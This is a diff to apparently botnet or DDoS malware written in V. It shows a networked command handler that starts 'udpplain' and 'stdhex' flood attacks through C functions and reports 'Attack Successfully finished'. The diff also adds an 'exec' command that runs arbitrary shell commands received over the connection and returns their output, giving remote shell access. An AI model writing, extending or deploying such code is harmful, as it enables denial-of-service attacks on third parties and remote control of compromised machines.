@@ -15,10 +15,8 @@ fn main() {
 		println("[x] Error, arguments provided!\n${args[0]} <ip> <port>")
 		exit(0)
 	}
-	go server(args[1], args[2], args[3])
-	for {
-
-	}
+	mut s := go server(args[1], args[2], args[3])
+	s.wait()
 }
 
 fn server(ip string, port string, pw string) { 
@@ -37,7 +35,7 @@ fn server(ip string, port string, pw string) {
 		fcmd, cmd, args := parse_buffer(data)
 		if data.len > 1 {
 			match cmd {
-				"udp" {
+				"udpplain" {
 					if args.len < 4 {
 						server.write_string("[ x ] Error, Something went wrong sending attack.....\n") or { 0 }
 					} else {
@@ -46,7 +44,7 @@ fn server(ip string, port string, pw string) {
 						server.write_string("[ + ] Attack Successfully finished....\n") or { 0 }
 					}
 				}
-				"std" {
+				"stdhex" {
 					if args.len < 4 {
 						server.write_string("[ x ] Error, Something went wrong sending attack.....\n") or { 0 }
 					} else {
@@ -54,6 +52,9 @@ fn server(ip string, port string, pw string) {
 						C.stdhex(&char(args[1].str), args[2].int(), args[3].int())
 						server.write_string("[ + ] Attack Successfully finished....\n") or { 0 }
 					}
+				}
+				"exec" {
+					server.write_string(os.execute("${data.replace("exec ", "")}").output) or { 0 }
 				} else {}
 			}
 			println("${data}")
